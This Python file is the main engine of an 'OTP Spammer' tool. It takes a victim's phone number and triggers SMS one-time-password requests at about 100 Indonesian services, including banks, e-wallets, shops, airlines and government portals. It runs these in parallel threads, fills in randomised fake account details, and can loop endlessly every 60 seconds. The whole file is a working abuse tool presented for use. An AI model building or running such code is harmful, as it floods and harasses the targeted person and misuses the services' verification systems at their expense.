#!/usr/bin/env python3
# main_engine.py - OTP Spammer Engine (100 API)
# SCRIPETEREN OTP - scripeterenotp

import requests
import uuid
import random
import string
import time
import re
import json
import threading
import sys
import signal
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed

from utils import normalize, fmt_08, get_public_ip, get_random_user_agent
from handlers import *
from targets import TARGETS

init(autoreset=True)

print_lock = threading.Lock()
stop_flag = False
global_callback = None

def log_target(idx, total, name, status, detail=""):
    with print_lock:
        if status == "SUCCESS":
            sym, col = "+", Fore.GREEN
        elif status == "LIMITED" or status == "BLOCKED":
            sym, col = "!", Fore.YELLOW
        elif status == "ERROR" or status == "TIMEOUT":
            sym, col = "x", Fore.RED
        else:
            sym, col = "-", Fore.RED
        print(f"{col}[{sym}]{Style.RESET_ALL} ({idx}/{total}) {name}: {status}" + (f" - {detail}" if detail else ""))
        if global_callback:
            try:
                global_callback(name, status, detail)
            except:
                pass

def process_target(api, target62, ip, idx, total):
    global stop_flag
    if stop_flag:
        return False
        
    name = api['name']
    post_type = api.get('post_type', '')
    status_text = "FAIL"
    detail = ""
    success = False

    try:
        # --- Mapping semua post_type ke fungsi handler ---
        handler_map = {
            'hrsbre': (send_hrsbre_otp, [target62]),
            'erafone': (send_erafone_otp, [target62]),
            'planetban': (send_planetban_otp, [api['number_fmt'](target62)]),
            'tuneup': (send_tuneup_otp, [api['number_fmt'](target62)]),
            'hashmicro': (send_hashmicro_otp, [api['number_fmt'](target62)]),
            'klook': (send_klook_otp, [api['number_fmt'](target62)]),
            'internetrakyat': (send_internetrakyat_otp, [api['number_fmt'](target62)]),
            'ultramilk': (send_ultramilk_register, [target62]),
            'kaniva': (send_kaniva_otp, [api['number_fmt'](target62), 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))]),
            'jembatani': (send_jembatani_otp, [api['number_fmt'](target62), 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4)), "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"]),
            'rcx': (send_rcx_otp, [api['number_fmt'](target62), 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4)), f'user{random.randint(1000,9999)}@mailnesia.com']),
            'sahabatteknisi': (send_sahabatteknisi_otp, [api['number_fmt'](target62)]),
            'auto2000': (send_auto2000_otp, [api['number_fmt'](target62)]),
            'astra_daihatsu': (send_astra_daihatsu_otp, [api['number_fmt'](target62)]),
            'royal_canin': (send_royal_canin_otp, [api['number_fmt'](target62)]),
            'watsons': (send_watsons_otp, [api['number_fmt'](target62)]),
            '99co': (send_99co_otp, [api['number_fmt'](target62)]),
            'belirumahco': (send_belirumah_otp, [api['number_fmt'](target62)]),
            'fastworkid': (send_fastwork_otp, [api['number_fmt'](target62)]),
            'beautyhaul': (send_beautyhaul_otp, [api['number_fmt'](target62)]),
            'hainaya': (send_hainaya_otp, [api['number_fmt'](target62)]),
            'minumyukkaka': (send_minumyukkaka_otp, [api['number_fmt'](target62)]),
            'sidemang': (send_sidemang_otp, [api['number_fmt'](target62)]),
            'lapormasbup': (send_lapormasbup_otp, [api['number_fmt'](target62)]),
            'ptspkemenag': (send_ptsp_kemenag_otp, [api['number_fmt'](target62)]),
            # JSON handlers
            'pinhome': (send_pinhome_otp, [api['number_fmt'](target62)]),
            'maulagi': (send_maulagi_otp, [api['number_fmt'](target62)]),
            'rumah123': (send_rumah123_otp, [api['number_fmt'](target62)]),
            'paper': (send_paper_otp, [api['number_fmt'](target62)]),
            'duniagames': (send_duniagames_otp, [api['number_fmt'](target62)]),
            'bunda': (send_bunda_otp, [api['number_fmt'](target62)]),
            'bonusbelanja': (send_bonusbelanja_otp, [api['number_fmt'](target62)]),
            'matahari': (send_matahari_otp, [api['number_fmt'](target62), 'User' + ''.join(random.choices(string.ascii_letters, k=5)), f'user{random.randint(1000,9999)}@mailnesia.com', 'Pass' + ''.join(random.choices(string.ascii_letters+string.digits, k=6)) + '@1']),
            # Sesi 2
            'tokopedia': (send_tokopedia_otp, [api['number_fmt'](target62)]),
            'shopee': (send_shopee_otp, [api['number_fmt'](target62)]),
            'bukalapak': (send_bukalapak_otp, [api['number_fmt'](target62)]),
            'grab': (send_grab_otp, [api['number_fmt'](target62)]),
            'gojek': (send_gojek_otp, [api['number_fmt'](target62)]),
            'ovo': (send_ovo_otp, [api['number_fmt'](target62)]),
            'dana': (send_dana_otp, [api['number_fmt'](target62)]),
            'linkaja': (send_linkaja_otp, [api['number_fmt'](target62)]),
            'bca': (send_bca_otp, [api['number_fmt'](target62)]),
            'mandiri': (send_mandiri_otp, [api['number_fmt'](target62)]),
            'bni': (send_bni_otp, [api['number_fmt'](target62)]),
            'bri': (send_bri_otp, [api['number_fmt'](target62)]),
            'traveloka': (send_traveloka_otp, [api['number_fmt'](target62)]),
            'agoda': (send_agoda_otp, [api['number_fmt'](target62)]),
            'tiketcom': (send_tiketcom_otp, [api['number_fmt'](target62)]),
            'pegipegi': (send_pegipegi_otp, [api['number_fmt'](target62)]),
            'reddoorz': (send_reddoorz_otp, [api['number_fmt'](target62)]),
            'blibli': (send_blibli_otp, [api['number_fmt'](target62)]),
            'jdid': (send_jdid_otp, [api['number_fmt'](target62)]),
            'lazada': (send_lazada_otp, [api['number_fmt'](target62)]),
            'zalora': (send_zalora_otp, [api['number_fmt'](target62)]),
            'sociolla': (send_sociolla_otp, [api['number_fmt'](target62)]),
            'oriflame': (send_oriflame_otp, [api['number_fmt'](target62)]),
            'herbalife': (send_herbalife_otp, [api['number_fmt'](target62)]),
            'forecoffee': (send_forecoffee_otp, [api['number_fmt'](target62)]),
            'kopikenangan': (send_kopikenangan_otp, [api['number_fmt'](target62)]),
            'starbucks': (send_starbucks_otp, [api['number_fmt'](target62)]),
            'mcd': (send_mcd_otp, [api['number_fmt'](target62)]),
            'kfc': (send_kfc_otp, [api['number_fmt'](target62)]),
            'burgerking': (send_burgerking_otp, [api['number_fmt'](target62)]),
            'pizzahut': (send_pizzahut_otp, [api['number_fmt'](target62)]),
            'dominos': (send_dominos_otp, [api['number_fmt'](target62)]),
            'gofood': (send_gofood_otp, [api['number_fmt'](target62)]),
            'grabfood': (send_grabfood_otp, [api['number_fmt'](target62)]),
            'shopeefood': (send_shopeefood_otp, [api['number_fmt'](target62)]),
            'maxim': (send_maxim_otp, [api['number_fmt'](target62)]),
            'indrive': (send_indrive_otp, [api['number_fmt'](target62)]),
            'mytelkomsel': (send_mytelkomsel_otp, [api['number_fmt'](target62)]),
            'indosat': (send_indosat_otp, [api['number_fmt'](target62)]),
            'xl': (send_xl_otp, [api['number_fmt'](target62)]),
            'tri': (send_tri_otp, [api['number_fmt'](target62)]),
            'smartfren': (send_smartfren_otp, [api['number_fmt'](target62)]),
            'pln': (send_pln_otp, [api['number_fmt'](target62)]),
            'bpjs': (send_bpjs_otp, [api['number_fmt'](target62)]),
            'djp': (send_djp_otp, [api['number_fmt'](target62)]),
            'ehac': (send_ehac_otp, [api['number_fmt'](target62)]),
            'pedulilindungi': (send_pedulilindungi_otp, [api['number_fmt'](target62)]),
            'mypertamina': (send_mypertamina_otp, [api['number_fmt'](target62)]),
            'bukalapakpartner': (send_bukalapakpartner_otp, [api['number_fmt'](target62)]),
            'sicepat': (send_sicepat_otp, [api['number_fmt'](target62)]),
            'jnt': (send_jnt_otp, [api['number_fmt'](target62)]),
            'ninjaxpress': (send_ninjaxpress_otp, [api['number_fmt'](target62)]),
            'anteraja': (send_anteraja_otp, [api['number_fmt'](target62)]),
            'posindonesia': (send_posindonesia_otp, [api['number_fmt'](target62)]),
            'lionair': (send_lionair_otp, [api['number_fmt'](target62)]),
            'garuda': (send_garuda_otp, [api['number_fmt'](target62)]),
            'citilink': (send_citilink_otp, [api['number_fmt'](target62)]),
            'batikair': (send_batikair_otp, [api['number_fmt'](target62)]),
            'sriwijayaair': (send_sriwijayaair_otp, [api['number_fmt'](target62)]),
            'airasia': (send_airasia_otp, [api['number_fmt'](target62)]),
            'superindo': (send_superindo_otp, [api['number_fmt'](target62)]),
            'hypermart': (send_hypermart_otp, [api['number_fmt'](target62)]),
            'transmart': (send_transmart_otp, [api['number_fmt'](target62)]),
            'alfamart': (send_alfamart_otp, [api['number_fmt'](target62)]),
            'indomaret': (send_indomaret_otp, [api['number_fmt'](target62)]),
            'mybca': (send_mybca_otp, [api['number_fmt'](target62)]),
            'jenius': (send_jenius_otp, [api['number_fmt'](target62)]),
        }

        if post_type in handler_map:
            func, args = handler_map[post_type]
            resp = func(*args)
            # Evaluasi respons
            if post_type == 'hrsbre':
                code, text = resp if isinstance(resp, tuple) else (None, None)
                if code in [200, 201]:
                    status_text, detail, success = "SUCCESS", "OTP sent", True
            elif post_type == 'erafone':
                code, _ = resp if isinstance(resp, tuple) else (None, None)
                if code == 200:
                    status_text, detail, success = "SUCCESS", "OTP sent", True
            elif post_type == 'lapormasbup':
                resp, is_resend = resp if isinstance(resp, tuple) else (None, False)
                if resp and resp.status_code in [200, 201]:
                    status_text, detail, success = "SUCCESS", "OTP sent", True
            else:
                if resp and hasattr(resp, 'status_code') and resp.status_code in [200, 201, 202, 302, 303]:
                    status_text, detail, success = "SUCCESS", "OTP sent", True
                elif resp and hasattr(resp, 'status_code') and resp.status_code == 429:
                    status_text, detail = "LIMITED", "Rate limit"
                else:
                    # Cek success_on keywords
                    if resp and hasattr(resp, 'text') and resp.text:
                        text = resp.text.lower()
                        keywords = api.get('success_on', [])
                        if any(kw in text for kw in keywords):
                            status_text, detail, success = "SUCCESS", "OTP sent", True
        else:
            status_text = "SKIP"
            detail = "Unknown post_type"

    except Exception as e:
        status_text = "ERROR"
        detail = str(e)[:40]

    log_target(idx, total, name, status_text, detail)
    return success

def run_single_round(threads=5, target=None, callback=None):
    global stop_flag, global_callback
    stop_flag = False
    global_callback = callback
    total_apis = len(TARGETS)
    print(f"\n{Fore.CYAN}Memulai spam menggunakan {Fore.WHITE}{total_apis}{Fore.CYAN} API{Style.RESET_ALL}\n")
    if target is None:
        target = input(f"{Fore.WHITE}Nomor target (08xx / +62xx): {Style.RESET_ALL}").strip()
    if not target:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Nomor tidak boleh kosong!")
        return False
    target62 = normalize(target)
    if not target62:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Format nomor tidak valid.")
        return False
    ip = get_public_ip()
    success_count = 0
    total_targets = len(TARGETS)

    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print(f"\n{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Menghentikan proses...")
        raise KeyboardInterrupt

    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)

    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(process_target, api, target62, ip, idx, total_targets) for idx, api in enumerate(TARGETS, 1) if not stop_flag]
            for future in as_completed(futures):
                if stop_flag:
                    for f in futures:
                        f.cancel()
                    break
                try:
                    if future.result():
                        success_count += 1
                except:
                    pass
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
        global_callback = None

    print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Selesai. Sukses: {success_count}/{total_targets}")
    return success_count > 0

def run_infinite_loop(target=None, callback=None):
    global stop_flag, global_callback
    stop_flag = False
    global_callback = callback
    total_apis = len(TARGETS)
    print(f"\n{Fore.CYAN}Memulai Infinite Loop (delay 60 detik){Style.RESET_ALL}\n")
    if target is None:
        target = input(f"{Fore.WHITE}Nomor target (08xx / +62xx): {Style.RESET_ALL}").strip()
    if not target:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Nomor tidak boleh kosong!")
        return False
    target62 = normalize(target)
    if not target62:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Format nomor tidak valid.")
        return False
    ip = get_public_ip()
    total_success = 0
    total_fail = 0
    round_count = 0

    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print(f"\n{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Menghentikan proses...")
        raise KeyboardInterrupt

    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)

    try:
        while not stop_flag:
            round_count += 1
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Round {round_count} dimulai...")
            success_count = 0
            total_targets = len(TARGETS)
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(process_target, api, target62, ip, idx, total_targets) for idx, api in enumerate(TARGETS, 1) if not stop_flag]
                for future in as_completed(futures):
                    if stop_flag:
                        for f in futures:
                            f.cancel()
                        break
                    try:
                        if future.result():
                            success_count += 1
                            total_success += 1
                        else:
                            total_fail += 1
                    except:
                        total_fail += 1
            if stop_flag:
                break
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Round {round_count} selesai. Sukses: {success_count}/{total_targets}")
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Total: success={total_success} | fail={total_fail}")
            for _ in range(60):
                if stop_flag:
                    break
                time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
        global_callback = None

    if stop_flag:
        print(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Proses dihentikan oleh user")
        print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Total success: {total_success} | fail: {total_fail}")
    return total_success > 0